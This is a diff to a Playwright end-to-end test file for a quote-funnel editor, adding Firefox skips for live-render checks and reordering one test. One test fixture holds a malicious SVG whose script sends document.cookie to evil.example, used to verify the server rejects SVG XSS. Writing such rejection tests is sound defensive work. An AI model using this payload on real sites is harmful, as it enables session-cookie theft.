@@ -129,6 +129,22 @@ async function ready(page: Page): Promise<void> {
   await expect(page.locator('#lg-funnel-root[data-lg-ready="1"]')).toHaveCount(1, { timeout: 10_000 });
 }
 
+// The dynamic-host live leg (shellUrl -> a *.e2e.test tenant host, resolved
+// via chromium's --host-resolver-rules launch arg) is chromium-only — firefox
+// has no equivalent for a wildcard/dynamic subdomain (network.dns.localDomains
+// cannot resolve one). On firefox: record a DOCUMENTED skip annotation
+// (visible in the reporter) and signal the caller to return after its
+// both-engine admin/authoring assertions — the SAME liveLegChromiumOnly()
+// pattern leadgen-operator-acceptance.gesture.spec.ts / leadgen-round4-
+// acceptance.gesture.spec.ts already use.
+function liveLegChromiumOnly(browserName: string, reason: string): boolean {
+  if (browserName === "firefox") {
+    test.info().annotations.push({ type: "live-leg-skip", description: reason });
+    return false;
+  }
+  return true;
+}
+
 let apiCtx: APIRequestContext;
 test.beforeAll(async () => {
   apiCtx = await playwrightRequest.newContext({ baseURL: ORIGIN });
@@ -217,7 +233,7 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
   // box picker -> save -> live it renders a tel: link (never nothing); author
   // a SECOND, conditionally-displayed slot -> live it is hidden+hooked.
   // =========================================================================
-  test('Item 10C — phone/CTA: a phone-only slot renders (B-4.3 silent no-render inverted); a __state-conditioned slot is hidden+hooked live', async ({ page }) => {
+  test('Item 10C — phone/CTA: a phone-only slot renders (B-4.3 silent no-render inverted); a __state-conditioned slot is hidden+hooked live', async ({ page, browserName }) => {
     const seed = await seedQuote(apiCtx, "cta");
     await openEditor(page, seed.quotePublicId);
     await page.locator('.lg-qtab[data-tab="templates"]').click();
@@ -251,6 +267,14 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
     expect((await framePut).status()).toBe(200);
     await expect(page.locator("#lg-quote-ok")).toBeVisible({ timeout: 20_000 });
 
+    if (
+      !liveLegChromiumOnly(
+        browserName,
+        "Item 10C live CTA render needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The Templates box-picker authoring + save assertions above run engine-agnostically.",
+      )
+    )
+      return;
+
     await page.goto(shellUrl(seed), { waitUntil: "load" });
     await ready(page);
     // Phone-only slot renders a tel: link — never silently nothing.
@@ -268,7 +292,7 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
   // it renders distinctly from "bar" (direct-API-seeded sibling funnels prove
   // ALL 6 styles are pairwise-unique, the exact P5a distinctness method).
   // =========================================================================
-  test('Item 10D — progress style picker is a real aligned control; "numbered" is authored + renders DISTINCT from "bar" live; all 6 styles pairwise-unique', async ({ page }) => {
+  test('Item 10D — progress style picker is a real aligned control; "numbered" is authored + renders DISTINCT from "bar" live; all 6 styles pairwise-unique', async ({ page, browserName }) => {
     const seed = await seedQuote(apiCtx, "prog");
     await openEditor(page, seed.quotePublicId);
     await canvas(page).locator("[data-frame-region='progress']").first().click();
@@ -286,6 +310,14 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
     const framePut = page.waitForResponse((r) => r.request().method() === "PUT" && r.url().includes(`/funnels/${seed.funnelPublicId}/frame`));
     await page.locator("#lg-variant-save").click();
     expect((await framePut).status()).toBe(200);
+
+    if (
+      !liveLegChromiumOnly(
+        browserName,
+        "Item 10D live pairwise-distinctness needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The style-picker authoring + alignment assertions above run engine-agnostically.",
+      )
+    )
+      return;
 
     // Pairwise-distinctness across the 5 RENDERING styles (the exact
     // __p5a-frame.spec.ts method/set) — "hidden" is deliberately EXCLUDED:
@@ -334,7 +366,7 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
   // above-section, page-1-only block through the REAL box picker -> save ->
   // reload round-trips -> LIVE the block shows on page 1 and hides on page 2.
   // =========================================================================
-  test("Item 10E — free text above the section, page-1-targeted, authored via the real picker -> round-trips -> hides on page 2 live", async ({ page }) => {
+  test("Item 10E — free text above the section, page-1-targeted, authored via the real picker -> round-trips -> hides on page 2 live", async ({ page, browserName }) => {
     const seed = await seedQuote(apiCtx, "ft");
     // Overwrite seedQuote's own single-page variant with a real 2-page one
     // (2 fresh sections) so the page-targeting leg has somewhere to hide on.
@@ -388,6 +420,14 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
     const row2 = page.locator('[data-tplbox-panel="free_text"] [data-ft-entry-row]').first();
     await expect(row2.locator("[data-ft-slot]"), "round-trips on reload").toHaveValue("above_section");
 
+    if (
+      !liveLegChromiumOnly(
+        browserName,
+        "Item 10E live page-targeting needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The free-text box-picker authoring + reload round-trip assertions above run engine-agnostically.",
+      )
+    )
+      return;
+
     await page.goto(shellUrl(seed), { waitUntil: "load" });
     await ready(page);
     const ftBlock = page.locator("text=Rates shown are illustrative.");
@@ -409,7 +449,7 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
   // MALICIOUS SVG (<script>) is rejected 400 with a plain-language message and
   // is never stored (the SVG-XSS security commitment).
   // =========================================================================
-  test("Item 10F — brand logos: a valid SVG uploads sanitized + renders live; a malicious SVG is rejected and never stored", async ({ page }) => {
+  test("Item 10F — brand logos: a valid SVG uploads sanitized + renders live; a malicious SVG is rejected and never stored", async ({ page, browserName }) => {
     const seed = await seedQuote(apiCtx, "logos");
     const VALID_SVG = `<?xml version="1.0"?><!-- brand --><svg viewBox="0 0 48 24"><rect width="48" height="24" fill="#1a56db"/><text x="4" y="16" font-size="10" fill="#fff">ACME</text></svg>`;
     const MALICIOUS_SVG = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://evil.example/'+document.cookie)</script></svg>`;
@@ -453,6 +493,14 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
     await page.locator("#lg-variant-save").click();
     expect((await framePut).status()).toBe(200);
 
+    if (
+      !liveLegChromiumOnly(
+        browserName,
+        "Item 10F live sanitized-image render needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The SVG upload/rejection assertions (pure API) + the brand-logos box-picker authoring above run engine-agnostically.",
+      )
+    )
+      return;
+
     await page.goto(shellUrl(seed), { waitUntil: "load" });
     await ready(page);
     const img = page.locator(".lg-frame-brand-logos img.lg-logo-strip-img");
@@ -469,7 +517,7 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
   // — the persona endpoint's ZERO-COST guards are proven, and "a generated url
   // renders" is proven via the SAME images element with a manually-set URL.
   // =========================================================================
-  test("Item 10G — trust row icon+text with hover tooltip renders live; the persona picker's zero-cost guards block BOTH misuses (no billable call); an image element renders + hides by page", async ({ page }) => {
+  test("Item 10G — trust row icon+text with hover tooltip renders live; the persona picker's zero-cost guards block BOTH misuses (no billable call); an image element renders + hides by page", async ({ page, browserName }) => {
     const seed = await seedQuote(apiCtx, "trust");
     await putFrame(apiCtx, seed.funnelPublicId, {
       version: 1,
@@ -478,18 +526,12 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
       // groups (each carrying its OWN items[]) — not a bare {items} object.
       trust_rows: [{ items: [{ icon: "shield-check", text: "Licensed in all 50 states", tooltip: "NAIC verified" }, { icon: "star", text: "4.8/5 rated" }] }],
     });
-    await page.goto(shellUrl(seed), { waitUntil: "load" });
-    await ready(page);
-    const row = page.locator(".lg-frame-trustrow").first();
-    await expect(row, "trust row renders live").toBeVisible();
-    await expect(row.locator(".lg-frame-trustrow-icon svg"), "both icon+text items render").toHaveCount(2);
-    const item = row.locator(".lg-frame-trustrow-item").first();
-    const tip = item.locator(".lg-frame-trustrow-tip");
-    expect(await tip.evaluate((el) => getComputedStyle(el).opacity), "tooltip hidden by default (CSS-only)").toBe("0");
-    await item.hover();
-    await expect.poll(async () => tip.evaluate((el) => getComputedStyle(el).opacity)).toBe("1");
 
-    // Persona picker: zero-cost guards, through the REAL Templates "images" box.
+    // Persona picker: zero-cost guards, through the REAL Templates "images"
+    // box — engine-agnostic admin-UI authoring, run FIRST (both engines)
+    // and BEFORE either live check so a single later live navigation sees
+    // both the trust_rows (seeded above) and this authored image together
+    // (no second/cache-busted navigation needed).
     await openEditor(page, seed.quotePublicId);
     await page.locator('.lg-qtab[data-tab="templates"]').click();
     await page.locator('[data-tplbox-pick="images"]').click();
@@ -519,11 +561,29 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
     const framePut = page.waitForResponse((r) => r.request().method() === "PUT" && r.url().includes(`/funnels/${seed.funnelPublicId}/frame`));
     await page.locator("#lg-variant-save").click();
     expect((await framePut).status()).toBe(200);
-    // SECOND navigation to the SAME shellUrl(seed) as line 481 above — cache-
-    // bust so the just-saved image element is genuinely re-fetched (the exact
-    // staleness class the Item 10D fix already found and fixed).
-    await page.goto(`${shellUrl(seed)}?_cb=${Date.now()}`, { waitUntil: "load" });
+
+    if (
+      !liveLegChromiumOnly(
+        browserName,
+        "Item 10G live trust-row + placed-image render needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The persona-picker zero-cost-guard admin-UI assertions above run engine-agnostically.",
+      )
+    )
+      return;
+
+    // ONE live navigation (both trust_rows and the authored image are
+    // already saved) — first-ever hit to this URL+content-version, so no
+    // cache-bust is needed (the Item 10D staleness class only applies to a
+    // SECOND hit on the SAME url after an intervening edit).
+    await page.goto(shellUrl(seed), { waitUntil: "load" });
     await ready(page);
+    const row = page.locator(".lg-frame-trustrow").first();
+    await expect(row, "trust row renders live").toBeVisible();
+    await expect(row.locator(".lg-frame-trustrow-icon svg"), "both icon+text items render").toHaveCount(2);
+    const item = row.locator(".lg-frame-trustrow-item").first();
+    const tip = item.locator(".lg-frame-trustrow-tip");
+    expect(await tip.evaluate((el) => getComputedStyle(el).opacity), "tooltip hidden by default (CSS-only)").toBe("0");
+    await item.hover();
+    await expect.poll(async () => tip.evaluate((el) => getComputedStyle(el).opacity)).toBe("1");
     const placedImg = page.locator('img[alt="Friendly advisor portrait"]');
     await expect(placedImg, "the placed image element renders live").toBeVisible();
   });
@@ -536,7 +596,7 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
   // save -> round-trips -> LIVE the footer has its OWN palette scope and the
   // bottom hover tooltip is CSS-only.
   // =========================================================================
-  test("Item 10H/10H-adj — footer v2 (about + link row, own palette scope) + disclosure v2 (top full + bottom hover) authored via the real pickers, round-trip, render live", async ({ page }) => {
+  test("Item 10H/10H-adj — footer v2 (about + link row, own palette scope) + disclosure v2 (top full + bottom hover) authored via the real pickers, round-trip, render live", async ({ page, browserName }) => {
     const seed = await seedQuote(apiCtx, "footer");
     await openEditor(page, seed.quotePublicId);
     await page.locator('.lg-qtab[data-tab="templates"]').click();
@@ -591,6 +651,14 @@ test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (regi
     const blocks = frameBody.frame_config.footer?.blocks ?? [];
     expect(blocks.find((b) => b.type === "about_paragraph")?.text).toBe("Operated by R4Q Insure Inc.");
     expect(blocks.find((b) => b.type === "link_row")?.links).toEqual([{ label: "Privacy", href: "/privacy" }]);
+
+    if (
+      !liveLegChromiumOnly(
+        browserName,
+        "Item 10H/10H-adj live footer+disclosure render needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The disclosure/footer box-picker authoring + server read-back assertions above run engine-agnostically.",
+      )
+    )
+      return;
 
     await page.goto(shellUrl(seed), { waitUntil: "load" });
     await ready(page);
